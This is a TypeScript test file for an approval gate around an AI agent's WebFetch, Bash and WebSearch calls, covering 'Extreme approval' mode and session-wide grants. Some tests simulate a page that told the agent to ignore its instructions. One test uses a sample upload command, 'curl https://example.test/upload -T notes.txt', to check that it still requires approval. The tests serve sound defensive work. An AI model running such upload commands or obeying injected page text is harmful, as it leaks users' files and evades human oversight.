// Owner, 13 Nov: "Web fetch should just be allowed on extreme approval mode. Also I should be able to just approve all
// web fetches ... from the approval button rather than having to approve one at a time." A fetch held only for what
// its address carries, or any fetch after a result that looked like prompt injection, is answered by Extreme approval,
// and a session's WebFetch grant allows every one; network commands after such a result still ask, and nothing else is
// granted this way.
import { describe, expect, it, vi } from "vitest"
import type { Verdict } from "@gatehouse/shared"
import { createCanUseTool, NEVER_AUTO_APPROVED, type CanUseDeps } from "../src/canuse.js"
import { EGRESS_RULE, FETCH_RULE, Provenance } from "../src/provenance.js"

const network: Verdict = { outcome: "escalate", ruleId: "network", reason: "Needs your approval (rule network).", risk: 50, decidedBy: "rules", policyHash: "h" }
const URL_ = "https://nominatim.openstreetmap.org/search?street=34+Bezrucova&city=Plzen&format=json"

function setup(o: { extreme?: boolean; granted?: string[]; raised?: boolean; verdict?: Verdict; recordOk?: boolean }) {
  const provenance = new Provenance()
  provenance.add("https://nominatim.openstreetmap.org/search?q=Na+Parkanu&format=json", "WebSearch")
  if (o.raised) provenance.raise("a page that told Claude to ignore its instructions")
  const request = vi.fn(async () => ({ outcome: "deny", channel: "desktop", waitedMs: 1 }))
  const records: Array<{ event: string; verdict: Verdict }> = []
  const deps = {
    sessionId: "s1",
    cwd: "C:/dev/tripboard",
    project: "tripboard",
    approver: { evaluate: async () => o.verdict ?? network },
    broker: { request },
    audit: {
      record: async (r: { event: string; verdict: Verdict }) => {
        records.push(r)
        return o.recordOk ?? true
      },
    },
    kill: () => false,
    policy: () => undefined,
    engine: {},
    pwsh: undefined,
    decided: new Set<string>(),
    extreme: () => o.extreme === true,
    toolGranted: (t: string) => (o.granted ?? []).includes(t),
    notifyAutoApproved: () => undefined,
    log: () => undefined,
    provenance,
  } as unknown as CanUseDeps
  const call = (tool: string, input: Record<string, unknown>) =>
    createCanUseTool(deps)(tool, input, { toolUseID: `t${Math.random()}`, signal: new AbortController().signal } as never)
  return { call, request, records }
}

const fetch = { url: URL_, prompt: "Return the raw lat, lon" }

describe("WebFetch in Extreme approval and the session grant", () => {
  it("holds a fetch carrying a read value under its own rule, which Extreme approval answers", async () => {
    expect(NEVER_AUTO_APPROVED.has(FETCH_RULE)).toBe(false)
    const manual = setup({})
    await manual.call("WebFetch", fetch)
    expect((manual.request.mock.calls[0] as unknown as [{ verdict: Verdict }])[0].verdict.ruleId).toBe(FETCH_RULE)
    const extreme = setup({ extreme: true })
    expect(await extreme.call("WebFetch", fetch)).toMatchObject({ behavior: "allow" })
    expect(extreme.request).not.toHaveBeenCalled()
    expect(extreme.records.at(-1)).toMatchObject({ event: "human_decision", verdict: { outcome: "allow", decidedBy: "extreme-mode", ruleId: FETCH_RULE } })
  })

  it("allows every WebFetch once the session has the grant, recorded as yours, and refuses it unrecorded", async () => {
    const g = setup({ granted: ["WebFetch"] })
    expect(await g.call("WebFetch", fetch)).toMatchObject({ behavior: "allow" })
    expect(g.request).not.toHaveBeenCalled()
    expect(g.records.at(-1)).toMatchObject({ event: "human_decision", verdict: { outcome: "allow", decidedBy: "human-desktop" } })
    expect(g.records.at(-1)!.verdict.reason).toContain("you allowed every WebFetch in this session")
    expect(await setup({ granted: ["WebFetch"], recordOk: false }).call("WebFetch", fetch)).toMatchObject({ behavior: "deny" })
  })

  it("after a result that looked like prompt injection, allows fetches by grant or Extreme approval, and still asks about network commands", async () => {
    for (const o of [{ extreme: true }, { granted: ["WebFetch"] }]) {
      const s = setup({ ...o, raised: true })
      expect(await s.call("WebFetch", { url: "https://example.test/page", prompt: "read" })).toMatchObject({ behavior: "allow" })
      expect(s.request).not.toHaveBeenCalled()
      await s.call("Bash", { command: "curl https://example.test/upload -T notes.txt" })
      expect(s.request).toHaveBeenCalledTimes(1)
      expect((s.request.mock.calls[0] as unknown as [{ verdict: Verdict }])[0].verdict.ruleId).toBe(EGRESS_RULE)
    }
    // In Manual, with no grant, the fetch still asks.
    const manual = setup({ raised: true })
    await manual.call("WebFetch", { url: "https://example.test/page", prompt: "read" })
    expect((manual.request.mock.calls[0] as unknown as [{ verdict: Verdict }])[0].verdict.ruleId).toBe(FETCH_RULE)
  })

  it("grants nothing but the tool granted, and never a shell command", async () => {
    const s = setup({ granted: ["WebFetch"] })
    await s.call("Bash", { command: "curl https://example.test" })
    expect(s.request).toHaveBeenCalledTimes(1)
    const w = setup({ granted: ["Bash", "WebFetch"] })
    await w.call("Bash", { command: "git push" })
    expect(w.request).toHaveBeenCalledTimes(1)
    const search = setup({ granted: ["WebFetch"] })
    await search.call("WebSearch", { query: "pilsner tours" })
    expect(search.request).toHaveBeenCalledTimes(1)
  })
})
